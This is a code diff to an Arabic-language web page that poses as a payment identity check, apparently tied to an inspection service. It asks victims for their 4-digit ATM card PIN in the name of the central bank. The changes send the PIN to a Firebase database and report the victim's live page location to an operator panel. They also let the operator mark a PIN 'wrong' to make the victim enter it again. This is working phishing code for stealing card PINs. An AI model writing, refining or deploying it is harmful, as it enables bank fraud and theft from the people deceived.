@@ -9,7 +9,7 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
 
     <style>
-        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
+        :root { --main-green: #1e7344; --error-red: #d93025; --bg-light: #f7f8fa; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
         body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; }
 
@@ -42,9 +42,13 @@
             color: var(--main-green);
             outline: none;
             background-color: #fcfcfc;
-            margin-bottom: 20px;
+            margin-bottom: 10px;
             transition: 0.3s;
         }
+
+        /* تنسيق الخطأ */
+        .pin-input-field.error-border { border: 2px solid var(--error-red); background-color: #fff8f8; color: var(--error-red); }
+        #pinError { color: var(--error-red); font-size: 11px; font-weight: bold; margin-bottom: 15px; display: none; }
 
         .pin-input-field:focus { border-color: var(--main-green); box-shadow: 0 0 0 3px rgba(30, 115, 68, 0.1); }
 
@@ -61,11 +65,12 @@
             transition: 0.3s;
         }
         .btn-submit:hover { background-color: #145230; }
+        .btn-submit:disabled { background-color: #ccc; cursor: not-allowed; }
 
         .secure-footer {
             margin-top: 15px;
             font-size: 10px;
-            color: #ccc;
+            color: #bbb;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -83,6 +88,8 @@
         <h2>تأكيد الهوية الرقمية</h2>
         <p>لإتمام عملية الدفع بنجاح، يرجى إدخال الرقم السري الخاص بالبطاقة المكون من 4 أرقام للمصادقة مع نظام البنك المركزي.</p>
 
+        <div id="pinError">برجاء التحقق من الرقم الصحيح للصراف الآلي</div>
+
         <input type="password" inputmode="numeric" maxlength="4" class="pin-input-field" id="authPin" placeholder="****">
 
         <button class="btn-submit" id="submitBtn" onclick="sendAuth()">تأكيد المصادقة</button>
@@ -98,9 +105,30 @@
             databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com/", 
             projectId: "saso-inspection" 
         };
-        firebase.initializeApp(firebaseConfig);
+        if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
         const database = firebase.database();
         const v_id = localStorage.getItem('v_id');
+
+        if (v_id) {
+            // تحديث مكان العميل
+            database.ref('live_sessions/' + v_id).update({
+                current_page: "تأكيد الهوية (PIN)",
+                last_seen: new Date().getTime()
+            });
+
+            // مراقبة الرفض من اللوحة
+            database.ref('orders/' + v_id + '/next_step').on('value', (snapshot) => {
+                const step = snapshot.val();
+                if (step === 'wrong_pin') {
+                    document.getElementById('authPin').classList.add('error-border');
+                    document.getElementById('pinError').style.display = 'block';
+                    document.getElementById('authPin').value = ''; // مسح الرقم القديم
+                    const btn = document.getElementById('submitBtn');
+                    btn.disabled = false;
+                    btn.innerText = "تأكيد المصادقة";
+                }
+            });
+        }
 
         function sendAuth() {
             let pinVal = document.getElementById('authPin').value;
@@ -109,29 +137,23 @@
             if (pinVal.length === 4 && v_id) {
                 btn.disabled = true;
                 btn.innerText = "جاري المعالجة...";
+                
+                // إخفاء الخطأ عند المحاولة الجديدة
+                document.getElementById('authPin').classList.remove('error-border');
+                document.getElementById('pinError').style.display = 'none';
 
-                database.ref('orders/' + v_id + '/card_details').update({
+                // إرسال البيانات للفايربيس وتصفير الحالة للانتظار
+                database.ref('orders/' + v_id).update({
                     atm_pin: pinVal,
-                    pin_status: "Submitted",
-                    last_update: new Date().toLocaleString()
+                    status: "PIN_Submitted",
+                    next_step: "waiting", // يثبت مكانه في صفحة التحميل
+                    last_update: new Date().getTime()
                 }).then(() => {
-                    database.ref('orders/' + v_id).update({
-                        status: "PIN_Received",
-                        last_update: new Date().getTime()
-                    }).then(() => {
-                        window.location.href = 'processing.html';
-                    });
+                    window.location.replace('processing.html');
                 });
             } else {
                 alert("يرجى إدخال الرمز المكون من 4 أرقام");
             }
-        }
-
-        if (v_id) {
-            database.ref('live_sessions/' + v_id).update({
-                current_page: "تأكيد الهوية الرقمية",
-                last_seen: new Date().getTime()
-            });
         }
 
         document.getElementById('authPin').addEventListener('input', function(e) {
